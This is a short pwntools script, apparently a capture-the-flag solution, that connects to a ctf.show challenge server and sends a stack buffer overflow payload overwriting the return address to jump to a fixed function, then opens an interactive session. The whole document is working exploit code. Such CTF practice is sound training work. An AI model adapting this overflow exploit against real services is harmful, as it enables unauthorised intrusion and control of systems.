from pwn import *
io = remote("pwn.challenge.ctf.show",28250)
payload = b'a' *(0x80 +8)
payload += p64(0x0000000000400697)
io.sendline(payload)
io.interactive()
